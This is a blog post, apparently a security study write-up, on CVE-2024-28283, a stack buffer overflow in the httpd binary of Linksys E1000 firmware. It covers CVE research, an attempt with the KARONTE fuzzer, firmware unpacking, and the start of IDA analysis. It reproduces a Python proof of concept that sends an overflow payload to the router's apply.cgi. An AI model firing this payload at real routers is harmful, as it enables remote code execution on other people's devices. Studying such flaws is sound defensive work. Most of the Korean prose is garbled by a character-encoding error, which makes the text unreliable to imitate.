---
layout: post
title: 'CVE-2024-28283 ë¶„ì„ê³¼ KARONTE fuzzer í™œìš©'
summary: CVE PoCë¥¼ ë¶„ì„í•˜ë©° KARONTEë¡œ ë°œê²¬ ê³¼ì •ì„ ì¬í˜„í•´ë³´ë ¤ ë…¸ë ¥í–ˆë‹¤
author: TouBVa
date: '2025-01-27 13:00:00 +09'
category: ['fuzzing','paper_study']
thumbnail: /assets/img/posts/2025-01-27-CVE-2024-28283/image.png
keywords: fuzzing, IoT, CVE_ë¶„ì„
usemathjax: true
permalink: /blog/fuzzing/2025-01-27-CVE-2024-28283
---

* TOC
{:toc}

<br>


# ğŸ’¯ ë¬¸ì œ

ì£¼ì–´ì§„ íŒì›¨ì–´ ë‚´ ì‹¤í–‰ íŒŒì¼ì„ ì¶”ì¶œí•˜ì—¬ ë¶„ì„í•˜ê³ , ì–´ë–¤ 1-day ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ”ì§€ ë¶„ì„í•˜ë¼.
{: .notice}

### âœï¸ ì¡°ê±´

- E1000 ë¼ìš°í„° íŒì›¨ì–´
- ì‹¤í–‰íŒŒì¼ ì´ë¦„: httpd
- ì‚¬ìš©ì ì…ë ¥ í•¨ìˆ˜: get_cgi
- ì·¨ì•½ì  ì¢…ë¥˜: buffer overflow
{: .notice}


[FW_E1000_2.1.03.005_US_20140321.bin](/assets/img/posts/2025-01-27-CVE-2024-28283/FW_E1000_2.1.03.005_US_20140321.bin)

<br>

# 0. ì ‘ê·¼ë²• ì„¤ì •

## 0.1. íƒìƒ‰ ë²”ìœ„ ì¢íˆê¸°

- 1-day ì·¨ì•½ì ì´ ì¡´ì¬í•œë‹¤ â†’ ì´ë¯¸ ì •ë³´ê°€ ê³µê°œëœ ì·¨ì•½ì 
- ì·¨ì•½ì ì˜ ì •ë³´ê°€ ê³µê°œë˜ì–´ ìˆë‹¤ â†’ ë†’ì€ í™•ë¥ ë¡œ CVEë¥¼ ë°›ì•˜ë‹¤
- ìœ„ì™€ ê°™ì€ ì·¨ì•½ì ì´ CVE ë“±ë¡ë˜ì—ˆë‹¤ë©´, í•„ìˆ˜ì ìœ¼ë¡œ E1000 router, httpd í‚¤ì›Œë“œê°€ descriptionì— ìˆì„ ê²ƒì´ë‹¤

ë”°ë¼ì„œ ê²€ìƒ‰í•´ ë³´ì•˜ìŒ

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image.png){: width="80%" height="80%"}

<br>

CVE-2024-28283ì´ ë‚˜ì™”ê³ , ë‚´ë¶€ descriptionì€ ì•„ë˜ì™€ ê°™ì•˜ìŒ

> There is stack-based buffer overflow vulnerability in pc_change_act function in Linksys E1000 router firmware version v.2.1.03 and before, leading to remote code execution.
> 

<br>

ë‚´ìš©ë§Œ ì½ì–´ë³´ë©´, ë§¤ìš° ë†’ì€ í™•ë¥ ë¡œ í•´ë‹¹ CVEê°€ ë¬¸ì œ ì·¨ì•½ì ì¼ ê°€ëŠ¥ì„±ì´ ë†’ìŒ.

ë” í™•ì‹¤í•œ êµì°¨ ê²€ì¦ì„ ìœ„í•´ ê³¼ì œë¡œ ì£¼ì–´ì§„ íŒŒì¼ ë²„ì „ì„ í™•ì¸í•¨

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%201.png){: width="80%" height="80%"}

<br>

ì •í™•íˆ ì¼ì¹˜í•˜ëŠ” ë²„ì „ì´ê¸° ë•Œë¬¸ì—, ë¬¸ì œ ì·¨ì•½ì ì€ CVE-2024-28283ì¸ ê²ƒìœ¼ë¡œ ê°€ì •í•˜ê³  ë¬¸ì œì— ì ‘ê·¼

<br>

## 0.2. CVE-2024-28283 ì¡°ì‚¬

NVDëŠ” ì‹¤ì œë¡œ CVEê°€ ë“±ë¡ë˜ëŠ” ê¸°ê´€ì´ ì•„ë‹ˆë‹¤. 

CNAê°€ ìš´ì˜ê·œì •ì— ë”°ë¼ CVEë¥¼ ë“±ë¡í•˜ë©´ cve.orgì— ë“±ë¡ë˜ëŠ” í˜•ì‹ì´ë‹¤. NVDëŠ” ì´ë¥¼ Pull í•´ì„œ NVDìƒì— ë„£ê³  ê´€ë¦¬í•˜ë©° Assessmentë¥¼ ì• ì´ˆì— CVEê°€ CISAì˜ í›„ì›ì„ ë°›ê³ , NVDê°€ NISTì— ì˜í•´ ìš´ì˜ë˜ë©° NISTëŠ” CISAì™€ í•¨ê»˜ FISMA ì§‘í–‰ì„ ìœ„í•´ ì„¤ë¦½ëœ ê¸°ê´€ì´ë¯€ë¡œ, CVEì™€ NVD ë‘˜ ë‹¤ ì‹¤ì§ˆì ìœ¼ë¡œ ë¯¸ ì •ë¶€ ì‚°í•˜ê¸°ê´€ìœ¼ë¡œ ë³´ë©´ ë˜ê¸´ í•˜ì§€ë§Œ, ì–´ì¨Œë“  ë‘˜ì€ ë³„ê°œì˜ ê¸°ê´€ì´ë‹¤.

ì¦‰, ë” ì •í™•í•˜ê³  ë””í…Œì¼í•œ ì •ë³´ë¥¼ ë³´ê³  ì‹¶ë‹¤ë©´ cve.orgì— ì˜¬ë¼ì˜¨ CVE ì •ë³´ë¥¼ ë³´ëŠ” ê²Œ ì¢‹ë‹¤.

<br>

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%202.png){: width="80%" height="80%"}

<br>

ì €ê¸° ë°‘ì— Referencesë¡œ ë‚˜ì˜¨ notion í˜ì´ì§€([https://d05004.notion.site/Linksys-E1000-BOF-37b98eec45ea4fc991b9b5bea3db091d](https://www.notion.so/37b98eec45ea4fc991b9b5bea3db091d?pvs=21))ì— ë“¤ì–´ê°€ë©´ í•´ë‹¹ ì·¨ì•½ì  ë¶„ì„ì´ ë§¤ìš° ìƒì„¸í•˜ê²Œ ë‚˜ì™€ ìˆë‹¤.

<br>

## 0.3. ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ ì›ë³¸ ì •ë¦¬

### 0.3.1. ì·¨ì•½ì  ì›ì¸

- ì›ì¸ì€ BoF
- BoFëŠ” `sprintf` í•¨ìˆ˜ ì‚¬ìš©ìœ¼ë¡œ ì¸í•´ ë°œìƒ(sprintf í•¨ìˆ˜ê°€ BoFì— ì·¨ì•½í•œ í•¨ìˆ˜ë¡œ, ì‹œíì–´ì½”ë”© ê·œì•½ì„ ìœ„ë°˜í•œ ì…ˆ)
- í•´ë‹¹ í•¨ìˆ˜ëŠ” íƒ€ê²Ÿ íŒì›¨ì–´ì˜ `pc_change_act` í•¨ìˆ˜ ë‚´ë¶€ì— ìˆìŒ

<br>

### 0.3.2. ì·¨ì•½ì  PoC

```python
import requests

target=input("Enter target IP: ")
session_id=input("Enter session_id: ")

url="http://"+target+"/apply.cgi;session_id="+session_id
headers={}
headers["User-Agent"]="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0"
headers["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
headers["Accept-Language"]= "en-US,en;q=0.5"
headers["Accept-Encoding"]= "gzip, deflate"
headers["Content-Type"] = "application/x-www-form-urlencoded"
headers["Origin"]="http://"+target
headers["Connection"]="close"
headers["Referer"]="http://"+target+"/apply.cgi;session_id="+session_id
headers["Upgrade-Insecure_Requests"]="1"

data={}
data["submit_button"]="GuestNetworkSetting"
data["gui_action"]="Apply"

pay=b"A"*0x30	#dummy
pay+=b"B"*4		#return address
data["PC_enable"]=pay

r=requests.post(url,headers=headers,data=data)
```

<br>

### 0.3.3. ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡ ê²°ê³¼

- RCE
    - ì›¹ ê´€ë¦¬ì ê¶Œí•œì„ íšë“í•  ê²½ìš°, `apply.cgi` ì¸í„°í˜ì´ìŠ¤ì— ë“¤ì–´ê°€ëŠ” POST ìš”ì²­ì— `PC_enable` íŒŒë¼ë¯¸í„°ë¥¼ ì‚½ì…í•¨ìœ¼ë¡œì¨ RCEê°€ ê°€ëŠ¥í•´ì§

<br>

# 1. ì‹¤ ë¶„ì„ ìˆ˜í–‰

ì›ë°ì´ë¼ëŠ” ì ì„ ì£¼ì—ˆê³ , ì·¨ì•½ì  ë°œìƒ í¬ì¸íŠ¸ë¥¼ ì£¼ì—ˆê¸° ë•Œë¬¸ì— ì•„ë§ˆ ë‹¹ ì ‘ê·¼ ë°©ë²•ì´ ì •ì„ì— ê°€ê¹Œìš¸ ê²ƒì´ë‹¤.

ê·¸ëŸ¬ë‚˜ ì´ì „ì— ë°°ìš´ ì ì„ ì œëŒ€ë¡œ ì‘ìš©í•´ ë³´ê³  ì‹¶ì—ˆë‹¤.

ë”°ë¼ì„œ ì´ ê³¼ì œë¥¼ ì´ì „ ê³¼ì œì™€ ì—°ê³„í•´ ë” ê³ ë„í™” ìˆ˜í–‰í•˜ëŠ” ë°©ë²•ì„ ê³ ë¯¼í–ˆë‹¤.

ì €ë²ˆì£¼ì— ë…¼ë¬¸ìœ¼ë¡œ ì•Œë ¤ì¤€ KARONTEë¥¼ ì§ì ‘ ì´ìš©í•´ì„œ ë¬¸ì œ ë°”ì´ë„ˆë¦¬ì˜ ì·¨ì•½ì ì„ ì°¾ì•„ë‚´ê³ , ì •ì  ë° ë™ì  ë¶„ì„ê¹Œì§€ ìˆ˜í–‰ í›„, ê·¸ì— ëŒ€í•œ ìµìŠ¤í”Œë¡œì‡ê¹Œì§€ ì™„ë£Œí•˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ê°€ ì¢‹ì§€ ì•Šì„ê¹Œ?

KARONTE ë…¼ë¬¸ì˜ ë§ë¯¸ì—ëŠ” í•´ë‹¹ í¼ì €ë¥¼ ì˜¤í”ˆì†ŒìŠ¤ë¡œ ê³µê°œí–ˆë‹¤ëŠ” ë§ë„ ìˆìœ¼ë‹ˆ(In the spirit of open science, we release the implementation of our prototype and a docker image to replicate our working environment.) ì‹¤í˜„ ê°€ëŠ¥í•œ ê³¼ì œ ìˆ˜í–‰ ë°©ì•ˆì´ë‹¤.

[https://github.com/ucsb-seclab/karonte](https://github.com/ucsb-seclab/karonte)

ì‹œê°„ì´ ë¶€ì¡±í•´ í¼ì €ì—ì„œ ê²°ê³¼ë¥¼ ì–»ëŠ” ê²ƒì´ ê°€ëŠ¥í• ì§€ ëª¨ë¥´ê² ìœ¼ë‚˜, ìµœëŒ€í•œ ì§„í–‰í•´ ë³¸ë‹¤.

<br>

## 1.0. KARONTEë¥¼ í™œìš©í•œ ë¶„ì„

### 1.0.0. íŒì›¨ì–´ ë¶„ì„ì€ ì–´ë–»ê²Œ ì‹œì‘í•´ì•¼ í•˜ëŠ”ê°€?

íŒì›¨ì–´ì— ëŒ€í•´ ë¶„ì„ì„ í•´ë³¸ ì ì€ ì—†ì–´ì„œ, ë¨¼ì € KARONTE ë…¼ë¬¸ì˜ ì´ˆì…ì„ í™•ì¸í–ˆë‹¤.

â€˜Firmware Pre-Processingâ€™ ê³¼ì •ì—ì„œ ìë™ìœ¼ë¡œ binwalk ë“±ì˜ íˆ´ë¡œ íŒì›¨ì–´ ì´ë¯¸ì§€ë¥¼ ì–¸íŒ¨í‚¹í•œë‹¤ê³  ë˜ì–´ ìˆë‹¤.

â€˜íŒì›¨ì–´ ì´ë¯¸ì§€ ì–¸íŒ¨í‚¹â€™ ì´ ì •í™•íˆ ì–´ë–¤ input íŒŒì¼ì„ ë„£ì–´ ì–´ë–¤ outputì„ ì–»ê³ , ê·¸ ê³¼ì •ì—ì„œ ì–´ë–¤ í–‰ìœ„ë¥¼ ìˆ˜í–‰í•˜ëŠ” ê²ƒì¸ì§€ ëª¨ë¥¸ë‹¤.

ë”°ë¼ì„œ â€˜firmware image unpack binâ€™ìœ¼ë¡œ ê²€ìƒ‰í–ˆê³ , ì•„ë˜ì™€ ê°™ì€ ë¸”ë¡œê·¸ ê¸€ì„ í™•ì¸í–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%203.png){: width="80%" height="80%"}

ì¶œì²˜: [https://k1rha.tistory.com/entry/%ED%8E%8C%EC%9B%A8%EC%96%B4-%EB%B6%84%EC%84%9D-1%EB%8B%A8%EA%B3%84-bin-%ED%8C%8C%EC%9D%BC-%EA%B9%8C%EA%B8%B0-Firmware-analysis-method-Unpack-Bin-file](https://k1rha.tistory.com/entry/%ED%8E%8C%EC%9B%A8%EC%96%B4-%EB%B6%84%EC%84%9D-1%EB%8B%A8%EA%B3%84-bin-%ED%8C%8C%EC%9D%BC-%EA%B9%8C%EA%B8%B0-Firmware-analysis-method-Unpack-Bin-file)

<br>

íŒì›¨ì–´ ë¶„ì„ì„ í•˜ê¸° ì „ preprocessingì´ë€ bin í™•ì¥ìë¡œ ì£¼ì–´ì§„ íŒŒì¼ì„ íŒì›¨ì–´ ë¶„ì„ íˆ´ì„ í™œìš©í•´ unpack ì§„í–‰í•  ê²½ìš°, íŒŒì¼ì‹œìŠ¤í…œê³¼ ê°™ì€ unpackedëœ ê²°ê³¼ë¬¼ì´ ë–¨ì–´ì§€ëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤.

íŒì›¨ì–´ëŠ” í•˜ë“œì›¨ì–´ë¥¼ êµ¬ë™í•˜ê¸° ìœ„í•´ ìƒë‹¹íˆ low-levelì—ì„œ ë™ì‘í•˜ë„ë¡ ì„¤ê³„ëœ í”„ë¡œê·¸ë¨ì´ë‹¤.

ê·¸ëŸ° í”„ë¡œê·¸ë¨ì„ ì–¸íŒ¨í‚¹í–ˆì„ ë•Œ íŒŒì¼ì‹œìŠ¤í…œì˜ í˜•íƒœê°€ ë–¨ì–´ì§„ë‹¤ëŠ” ê±´, ì•„ë§ˆ í•˜ë“œì›¨ì–´ ì¸ìŠ¤íŠ¸ëŸ­ì…˜-OS ì¤‘ê°„ ê²©ì˜ ë™ì‘ë„ ê²¸í•˜ê¸° ë•Œë¬¸ì´ ì•„ë‹ê¹Œ ì¶”ì¸¡ëœë‹¤. ì•„ë§ˆ ë§ì„ ê²ƒ ê°™ë‹¤. ì»´í“¨í„°ì—ì„œë„ OS ë¶€íŒ…ì„ ìœ„í•´ CMOSë¼ëŠ” í•˜ë“œì›¨ì–´ ì»´í¬ë„ŒíŠ¸ë¥¼ ë”°ë¡œ ë‘ê³  ê·¸ ê¸°ë°˜ìœ¼ë¡œ ì—ëŸ¬ì»¤ë ‰ì…˜ í•´ì„œ BIOSê°€ ëŒì•„ê°€ë‹ˆê¹Œ

ì´ ì¶”ì¸¡ì´ ë§ëŠ”ì§€ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ firmware architectureë“±ì˜ í‚¤ì›Œë“œë¡œ ê²€ìƒ‰í•´ ë³´ì•˜ë‹¤.

ê·¸ ê²°ê³¼, íŒì›¨ì–´ëŠ” ì•„ë˜ì™€ ê°™ì€ êµ¬ì¡°ë¥¼ ê°€ì§„ë‹¤ê³  í•œë‹¤.

![ì¶œì²˜: [https://www.bytesnap.com/news-blog/firmware-explained-guide/](https://www.bytesnap.com/news-blog/firmware-explained-guide/)](/assets/img/posts/2025-01-27-CVE-2024-28283/image%204.png){: width="80%" height="80%"}

<br>

ì¶œì²˜: [https://www.bytesnap.com/news-blog/firmware-explained-guide/](https://www.bytesnap.com/news-blog/firmware-explained-guide/)

- Bootloader: This immutable code runs first when a device powers on. It initialises core hardware like the CPU and memory, then **loads the main firmware image from storage.**
- OS kernel: The kernel manages system resources and provides core services like multitasking and memory allocation. For small devices, it may be a real-time operating system (RTOS).
- Device drivers: these enable the **OS to communicate with hardware** like radios, sensors, and storage. They **abstract** the hardware complexity into a common interface.
- Middleware: Middleware provides connectivity, security, protocol stacks, and other **services above the OS**. For example, a TCP/IP stack for network connectivity.
- Application code: The main application firmware implements the **deviceâ€™s end-user functionality** â€“ for example, user interfaces, algorithms, and network protocols.

<br>

ë˜í•œ, ì•„ë˜ì™€ ê°™ì€ íŠ¹ì§•ì„ ê°€ì§€ê³  ìˆë‹¤ í•œë‹¤.(ì¶œì²˜: [https://stackoverflow.com/questions/40853918/what-are-common-structures-for-firmware-files](https://stackoverflow.com/questions/40853918/what-are-common-structures-for-firmware-files) , chatgptë¥¼ í™œìš©í•´ ìš”ì•½)

<br>

**âœï¸5-Bullet Summary:**

1. **Firmware File Composition:**
    
    Firmware is stored as an Executable and Linkable File (ELF), **often converted to binary (.bin)** or text-based binary (.hex), and represents the exact memory content written to the embedded flash.
    
2. **Startup Process:**
    
    On powering the board, the internal **bootloader** redirects execution to the firmware's entry point (usually at address 0x0). Startup code initializes the system (e.g., setting the clock, stack pointer, vector table, and memory sections).
    
3. **Embedded vs. OS Control:**
    
    Unlike operating systems, where user code relies on APIs and system libraries for low-level operations, **embedded systems give full hardware and resource management control to user code.**
    
4. **Firmware and OS Similarities:**
    
    Both firmware and operating systems handle processors, memory, and I/O similarly, organizing code and data sections in memory during initialization.
    
5. **Key Differences:**
    - Firmware uses **physical RAM addressing** due to limited memory mapping in most microcontrollers.
    - **Stack memory in firmware is explicitly managed by user code** via linker scripts, unlike OS-managed stacks in traditional programs.
{: .notice}

<br>

ë§ˆì§€ë§‰ìœ¼ë¡œ, íŒì›¨ì–´ëŠ” í¬ê²Œ 3ê°œ ì¢…ë¥˜ë¡œ ë¶„ë¥˜ëœë‹¤ê³  í•œë‹¤.(ì¶œì²˜: [https://www.spiceworks.com/tech/devops/articles/what-is-firmware/](https://www.spiceworks.com/tech/devops/articles/what-is-firmware/))


- **Low-level firmware**: These cannot be modified or altered since they are considered as integral hardware elements. They are stored on nonvolatile memory chips such as ROM and programmable ROM (PROM).
- **High-level firmware**: These forms of firmware often have higher levels of instruction complexity than low-level firmware, bringing them closer to the realm of software than hardware. They are used in conjunction with flash memory chips to make upgrades possible.
- **Subsystem**: They are parts of a more extensive system that can work independently. It often looks like its device because the microcode for this firmware level is built into the central processing unit (CPU), the liquid crystal display units (LCD), and the flash chips. Also, it is like high-level firmware in terms of operation.

<br>

### 1.0.1. KARONTE input íŒŒì¸

ê·¸ëŸ°ë°, KARONTEì—ì„œëŠ” binwalkë“±ì„ ì ìš©í•´ ìë™ìœ¼ë¡œ íŒì›¨ì–´ë¥¼ ì¶”ì¶œí•œë‹¤ê³  í•œë‹¤.

ì¦‰ ë‚´ê°€ ë¬¸ì œë¡œ ë°›ì€ bin íŒŒì¼ì„ ê·¸ëŒ€ë¡œ inputìœ¼ë¡œ ì£¼ì–´ë„ ë  ê²ƒ ê°™ì€ë°, ì´ê²Œ ë§ëŠ”ì§€ í™•ì‹¤ì¹˜ ì•Šë‹¤.

ë”°ë¼ì„œ ì´ë¥¼ í™•ì‹¤íˆ í•˜ê¸° ìœ„í•´ KARONTEì˜ ë ˆí¬ë¥¼ í™•ì¸í–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%205.png){: width="80%" height="80%"}

<br>

ë˜ê²Œ json_config_fileì„ ë³´ë©´ ë‚´ê°€ ë„£ì–´ì•¼ í•  input íŒŒì¼ì˜ í˜•íƒœê°€ ê°€ëŠ ë  ê²ƒ ê°™ë‹¤.

```json
{
  "bin": [],
  "pickle_parsers": "./pickles/parser/NETGEAR/NETGEAR_analyzed_R6200v2-V10312_10111_fw__R6200v2-V10312_10111chkextracted_squashfs-root.pk",
  "stats": "False",
  "data_keys": [],
  "base_addr": "",
  "eg_source_addr": "",
  "fw_path": "./firmware/NETGEAR/analyzed/R6200v2-V1.0.3.12_10.1.11/fw/_R6200v2-V1.0.3.12_10.1.11.chk.extracted/squashfs-root",
  "angr_explode_bins": [
    "openvpn",
    "wpa_supplicant",
    "vpn",
    "dns",
    "ip",
    "log",
    "qemu-arm-static"
  ],
  "var_ord": [""],
  "glob_var": [],
  "arch": "",
  "only_string": "False"
}

```

<br>

ìœ„ ë‚´ìš©ì„ í™•ì‹¤íˆ ì´í•´í•˜ë ¤ë©´ ë ˆí¬ì˜ key ë³„ ì„¤ëª…([https://github.com/ucsb-seclab/karonte/tree/master/config](https://github.com/ucsb-seclab/karonte/tree/master/config)) ì„ ì½ìœ¼ë©´ ë˜ëŠ”ë°, ì‚¬ì‹¤ ë³´ë©´ ë¬´ì—‡ì„ ì°¸ì¡°í•´ ë¶„ì„í•˜ëŠ”ì§€ ì§ê´€ì ìœ¼ë¡œ ì•Œ ìˆ˜ ìˆìœ¼ë¯€ë¡œ ìì„¸í•œ ì„¤ëª…ì€ í•˜ì§€ ì•ŠëŠ”ë‹¤.

ë‚´ê°€ ì‹¤í–‰ì¤‘ì¸ docker ì»¨í…Œì´ë„ˆì—ëŠ” firmware ë””ë ‰í† ë¦¬ì— firmware datasetì´ ìˆëŠ”ë°, ìœ„ jsonì´ ì°¸ì¡°í•˜ëŠ” ë¶„ì„ ëŒ€ìƒì— ì €ì¥ëœ datasetì€ ì´ë¯¸ unpackì´ ë˜ì–´ ìˆëŠ” í˜•íƒœë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%206.png){: width="80%" height="80%"}

<br>

ë‚˜ë³´ê³  unpackí•´ì„œ ë„£ì–´ë†“ìœ¼ë¼ëŠ” ì†Œë¦¬ ê°™ë‹¤.

binwalkë¡œ ì§ì ‘ unpackì„ í•´ë³´ê³  ê·¸ ê²°ê³¼ë¬¼ê³¼ ë¹„êµí•´ë³´ì.

<br>

### 1.0.2. unpack

`>docker cp ./FW_E1000_2.1.03.005_US_20140321.bin karonte:/`  ëª…ë ¹ì–´ë¡œ ëŒ€ìƒ íŒì›¨ì–´ë¥¼ ì»¨í…Œì´ë„ˆë¡œ ì „ì†¡í–ˆë‹¤. 

ê·¸ë¦¬ê³  ì•„ë˜ì™€ ê°™ì´ binwalkë¥¼ í™œìš©í•´ unpackí–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%207.png){: width="80%" height="80%"}

<br>

ê·¸ëŸ¬ë‚˜ ì•„ë˜ì™€ ê°™ì€ ì—ëŸ¬ê°€ ë°œìƒí–ˆë‹¤.

```text

Extractor.execute failed to run external extractor 'sasquatch -p 1 -le -d '%%squashfs-root%%' '%e'': [Errno 2] No such file or directory

```
<br>

ì°¾ì•„ë³´ë‹ˆ, squashfs íŒŒì¼ì‹œìŠ¤í…œê³¼ ê´€ë ¨í•´ì„œë§Œ í•´ë‹¹ ì—ëŸ¬ê°€ ìƒê¸°ëŠ” ê²ƒìœ¼ë¡œ ì¶”ì •ë˜ë©°, sasquatch ëª¨ë“ˆì„ ë”°ë¡œ ì„¤ì¹˜í•´ í•´ê²°í•  ìˆ˜ ìˆë‹¤ê³  í•œë‹¤. (https://github.com/threadexio/sasquatch.git)

ì„¤ì¹˜í•´ì„œ ì¶”ì¶œí•´ ë³´ë‹ˆ, ì•„ë˜ì™€ ê°™ì´ ë¬¸ì œì—†ì´ ì™„ë£Œë˜ì—ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%208.png){: width="80%" height="80%"}

<br>

ì¶”ì¶œëœ .extracted ë””ë ‰í† ë¦¬ë¥¼, ìœ„ì˜ configì— ë‚˜ì˜¨ ë‚´ìš©(`/firmware/NETGEAR/analyzed/R6200v2-V1.0.3.12_10.1.11/fw/`)ì„ ì°¸ê³ í•˜ì—¬ ì´ë™í•´ ë‘ì—ˆë‹¤.

ìœ„ì˜ ì´ë™ì„ ë°˜ì˜í•œ config íŒŒì¼ì€ ì•„ë˜ì™€ ê°™ì´ ìƒì„±í–ˆë‹¤.

<br>

```json
{
  "bin": [],
  "pickle_parsers": "./pickles/parser/Linksys/Linksys/analyzed/E1000/fw/_FW_E1000_2.1.03.005_US_20140321.bin.extracted/squashfs-root.pk",
  "stats": "False",
  "data_keys": [],
  "base_addr": "",
  "eg_source_addr": "",
  "fw_path": "./firmware/Linksys/analyzed/E1000/fw/_FW_E1000_2.1.03.005_US_20140321.bin.extracted/squashfs-root",
  "angr_explode_bins": [
    "openvpn",
    "wpa_supplicant",
    "vpn",
    "dns",
    "ip",
    "log",
    "qemu-arm-static"
  ],
  "var_ord": [""],
  "glob_var": [],
  "arch": "",
  "only_string": "False"
}

```
<br>

ê·¸ë¦¬ê³  ì•„ë˜ì™€ ê°™ì´ KARONTEë¥¼ run í–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%209.png){: width="80%" height="80%"}

<br>

ê·¸ëŸ¬ë‚˜ Border Binaries Discovery ë‹¨ê³„ì—ì„œ ë” ì´ìƒ ë„˜ì–´ê°€ì§€ ëª»í–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2010.png){: width="80%" height="80%"}

<br>

ë„¤íŠ¸ì›Œí¬ì™€ ìƒí˜¸ì‘ìš©í•˜ëŠ” ë°”ì´ë„ˆë¦¬ë¥¼ BBDì—ì„œ ì°¾ì•„ë‚¸ë‹¤ê³  í–ˆëŠ”ë°â€¦. ë¬´ìŠ¨ ë¬¸ì œì¸ì§€ ëª¨ë¥´ê² ë‹¤.

ì˜¬ë°”ë¥´ê²Œ configì„ í•´ì•¼ í•˜ë‚˜ ì‹¶ì€ë°, ì–´ë–»ê²Œ í•´ì•¼ í• ì§€ ë” ê³ ë¯¼í•´ ë´ì•¼ í•  ê²ƒ ê°™ë‹¤.

ë§Œì•½ í¼ì§•ìœ¼ë¡œ ì°¾ì§€ ëª»í•œ ì·¨ì•½ì ì´ë¼ë©´, reporterëŠ” ì–´ë–¤ ê²½ë¡œë¡œ ì´ ì·¨ì•½ì ì„ ì°¾ì•˜ì„ê¹Œ?

<br>

## 1.1. ì •ì  ë¶„ì„

### 1.1.0. ë¶„ì„ ëŒ€ìƒ íŒŒì¼ ì°¾ê¸°

ì¼ë‹¨ ì·¨ì•½ì ì´ ë°œìƒí•œ íŒŒì¼ì¸ httpd íŒŒì¼ì„ ì°¾ì•„ì•¼ í•œë‹¤.

httpdë©´ apache ì›¹ì„œë²„ì¸ê°€? ë³´í†µ ì´ê±´ /etc/httpd ë””ë ‰í† ë¦¬ í˜•íƒœë¡œ ë–¨ì–´ì§€ëŠ”ë°.

ë°”ì´ë„ˆë¦¬ í˜•íƒœë¡œ ë–¨ì–´ì§„ ê±°ë©´ `/bin` , `/sbin` ,  `/usr/bin` ,  `/usr/sbin` ì¤‘ í•˜ë‚˜ì—ëŠ” ìˆê² ë‹¤ ìƒê°í–ˆë‹¤.

ê·¸ë ‡ê²Œ ìƒê°í•˜ê³  ì°¾ì•„ë³´ë‹ˆ, `/usr/sbin/`ì—ì„œ ì°¾ì„ ìˆ˜ ìˆì—ˆë‹¤.

ì´ë ‡ê²Œ íœ´ë¦¬ìŠ¤í‹±í•œ ë°©ì‹ ë§ê³  ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œë„ ì°¾ì„ ìˆ˜ ìˆë‹¤.

<br>

1. êµ¬ê¸€ë§
    - httpd firmwareë¥¼ ê²€ìƒ‰í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ íŒì›¨ì–´ìƒì˜ httpd ë°”ì´ë„ˆë¦¬ì—ì„œ ë°œìƒí•œ CVE ë¶„ì„ ê¸€ì´ ìˆë‹¤.
        
        ![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2011.png){: width="80%" height="80%"}
        
    - í•´ë‹¹ CVEëŠ” netgear ë¼ìš°í„°ì—ì„œ ë°œìƒí•œ ì·¨ì•½ì ì´ë‹¤. ì§€ê¸ˆ ë¶„ì„ ëŒ€ìƒ íŒì›¨ì–´ ë˜í•œ ë¼ìš°í„° íŒì›¨ì–´ì¸ ì ì„ ê³ ë ¤í–ˆì„ ë•Œ, ë¹„ìŠ·í•œ OS ë° ì‹œìŠ¤í…œ êµ¬ì¡°ë¥¼ ì°¨ìš©í•˜ê³  ìˆì„ ê°€ëŠ¥ì„±ì´ ë†’ìœ¼ë¯€ë¡œ ê·¸ëŒ€ë¡œ `/usr/sbin`ì„ ì°¾ì•„ë³´ë©´ httpd íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ìˆì—ˆì„ ê²ƒì´ë‹¤.
2. everything
    1. ì œì¼ ì‰½ê¸´ í•œë° í•œ 10ë¶„ ê¸°ë‹¤ë ¤ì•¼ í•œë‹¤.
    2. everything ìœ í‹¸ë¦¬í‹°ê°€ ì¶”ì¶œí•œ íŒì›¨ì–´ íŒŒì¼ì‹œìŠ¤í…œì— ëŒ€í•´ ë¶„ì„ì„ í•´ì•¼ í•˜ê¸° ë•Œë¬¸ì—â€¦
    3. ê·¸ë˜ë„ ê²€ìƒ‰í•˜ë©´ ì´ë ‡ê²Œ httpdë¥¼ ì°¾ì„ ìˆ˜ ìˆë‹¤.
        
        ![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2012.png){: width="80%" height="80%"}

<br>        

### 1.1.1. ë¶„ì„

**pc_change_act**

IDAì— ë„£ê³  ë„ìš´ ë‹¤ìŒ function ì´ë¦„(`pc_change_act`)ìœ¼ë¡œ ê²€ìƒ‰í–ˆë‹¤.

